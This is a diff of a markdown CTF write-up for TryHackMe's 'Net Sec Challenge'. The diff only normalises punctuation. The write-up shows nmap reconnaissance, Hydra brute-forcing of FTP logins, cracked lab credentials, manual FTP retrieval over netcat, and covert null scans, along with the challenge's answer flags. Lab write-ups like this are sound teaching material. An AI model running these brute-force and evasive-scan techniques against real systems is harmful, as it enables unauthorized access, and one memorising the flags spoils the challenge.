@@ -5,11 +5,11 @@ date:: 2022-04-03
 
 * [TryHackMe: Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)
 
-This CTF is just a series of questions. All should be solvable using nmap, telnet, and Hydra… Though I’m going to substitute netcat for telnet. However, I’m sticking to the spirit of things, and will only use those three tools.
+This CTF is just a series of questions. All should be solvable using nmap, telnet, and Hydra... Though I'm going to substitute netcat for telnet. However, I'm sticking to the spirit of things, and will only use those three tools.
 
 The target machine is 10.10.152.115.
 
-We’ll start off with a full nmap scan:
+We'll start off with a full nmap scan:
 
 ```bash
 sudo nmap -v -oN net-sec-challenge -Pn -A --reason -T4 \
@@ -98,16 +98,16 @@ OS and Service detection performed. Please report any incorrect results at https
 
 This enables us to answer a set of questions immediately.
 
-* What is the highest port number being open less than 10,000? — `8080`
-* There is an open port outside the common 1000 ports; it is above 10,000. What is it? — `10021`
-* How many TCP ports are open? — `6`
-* What is the flag hidden in the HTTP server header? — `THM{web_server_25352}`
-* What is the flag hidden in the SSH server header? — `THM{946219583339}`
-* We have an FTP server listening on a nonstandard port. What is the version of the FTP server? — `vsftpd 3.0.3`
+* What is the highest port number being open less than 10,000? - `8080`
+* There is an open port outside the common 1000 ports; it is above 10,000. What is it? - `10021`
+* How many TCP ports are open? - `6`
+* What is the flag hidden in the HTTP server header? - `THM{web_server_25352}`
+* What is the flag hidden in the SSH server header? - `THM{946219583339}`
+* We have an FTP server listening on a nonstandard port. What is the version of the FTP server? - `vsftpd 3.0.3`
 
-That’s all pretty easy. The next one is a bit harder with our limited toolset…
+That's all pretty easy. The next one is a bit harder with our limited toolset...
 
-We start off by attempting to brute force the password for `eddie` or `quinn` using Hydra. To do this, we’re going to run two Hydra tasks in parallel.
+We start off by attempting to brute force the password for `eddie` or `quinn` using Hydra. To do this, we're going to run two Hydra tasks in parallel.
 
 ```bash
 # Hydra task to break eddie's password.
@@ -123,7 +123,7 @@ hydra -v -f -t 10 -s 10021 -l quinn \
          10.10.152.115 ftp
 ```
 
-These quickly return the results `eddie:jordan` and `quinn:andrea`. Let’s try to use `nc -nv 10.10.152.115 10021` to log into `eddie`’s account.
+These quickly return the results `eddie:jordan` and `quinn:andrea`. Let's try to use `nc -nv 10.10.152.115 10021` to log into `eddie`'s account.
 
 ```ftp
 (UNKNOWN) [10.10.152.115] 10021 (?) open
@@ -142,9 +142,9 @@ QUIT
 221 Goodbye.
 ```
 
-The trick here is that the passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address (10.10.152.115), and p1 – p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, `nc -nv 10.10.152.115 30565`. We start this *before* entering the LIST command, revealing that `eddie` has access to no files.
+The trick here is that the passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 - o4 are the four octets of the server's IP address (10.10.152.115), and p1 - p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, after entering passive mode we can catch the reply using a second netcat instance, `nc -nv 10.10.152.115 30565`. We start this *before* entering the LIST command, revealing that `eddie` has access to no files.
 
-Let’s have the same conversation for `quinn`.
+Let's have the same conversation for `quinn`.
 
 ```ftp
 (UNKNOWN) [10.10.152.115] 10021 (?) open
@@ -169,19 +169,19 @@ QUIT
 
 This time we need to open *two* auxiliary netcat sessions. The first, `nc -nv 10.10.152.115 30754`, catches the LIST command, which reveals that `quinn` has access to an `ftp_flag.txt` file. The second, `nc -nv 10.10.152.115 30037`, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.
 
-* We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP? — `THM{321452667098}`
+* We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP? - `THM{321452667098}`
 
-For the final challenge, we go to `http://10.10.152.115:8080`. The challenge is to scan 10.10.152.115 “as covertly as possible”. I’m not really willing to wait 7 months for a scan, but I’ll bet that all we need to do is use `-T1` and drop `-A`.
+For the final challenge, we go to `http://10.10.152.115:8080`. The challenge is to scan 10.10.152.115 "as covertly as possible". I'm not really willing to wait 7 months for a scan, but I'll bet that all we need to do is use `-T1` and drop `-A`.
 
 ```bash
 sudo nmap -v -Pn -n -T1 -p- 10.10.152.115
 ```
 
-Well, that didn’t work — “71% chance of scan being detected” and we’re nowhere near done. That, and the machine expired without me even noticing.
+Well, that didn't work - "71% chance of scan being detected" and we're nowhere near done. That, and the machine expired without me even noticing.
 
 New target IP is 10.10.34.244.
 
-Maybe speed doesn’t matter here? Let’s try a scan that shouldn’t even look like a connection — an ACK scan — but at a more “normal” rate.
+Maybe speed doesn't matter here? Let's try a scan that shouldn't even look like a connection - an ACK scan - but at a more "normal" rate.
 
 ```bash
 sudo nmap -v -Pn -n -T4 -sA -p- 10.10.34.244
@@ -195,17 +195,17 @@ What about a null scan? That might actually get me more information than an ACK 
 sudo nmap -v -Pn -n -T4 -sN -p- 10.10.34.244
 ```
 
-“Null scan” is apparently the right answer, as the challenge provided the flag almost immediately (which doesn’t *actually* make any sense, but whatever…).
+"Null scan" is apparently the right answer, as the challenge provided the flag almost immediately (which doesn't *actually* make any sense, but whatever...).
 
-* Browsing to `http://10.10.152.115:8080` displays a small challenge that will give you a flag once you solve it. What is the flag? — `THM{f7443f99}`
+* Browsing to `http://10.10.152.115:8080` displays a small challenge that will give you a flag once you solve it. What is the flag? - `THM{f7443f99}`
 
 ELAPSED TIME: 2 h 31 min
 
 ## References
 
-* [Using “nmap”](nmap.md)
+* [Using "nmap"](nmap.md)
 * [Using Hydra](hydra.md)
-* [Using “netcat”](netcat.md)
+* [Using "netcat"](netcat.md)
 * [File Transfer Protocol (FTP)](ftp.md)
 * [How to list FTP directories using telnet?](https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402)
 * [FTP Commands: QUIT, USER, ABOR, ACCT, SYST, XDEL](https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command)
